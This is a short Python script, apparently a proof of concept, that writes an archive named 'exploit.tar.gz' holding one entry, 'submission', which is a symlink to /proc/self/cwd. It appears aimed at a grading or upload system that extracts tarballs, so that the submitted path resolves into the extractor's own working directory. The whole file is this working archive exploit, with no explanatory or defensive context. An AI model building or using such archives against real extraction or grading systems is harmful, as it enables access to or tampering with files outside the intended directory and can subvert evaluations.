import tarfile

with tarfile.open('exploit.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo("submission")
    info.type = tarfile.SYMTYPE
    info.linkname = "/proc/self/cwd"
    tar.addfile(info)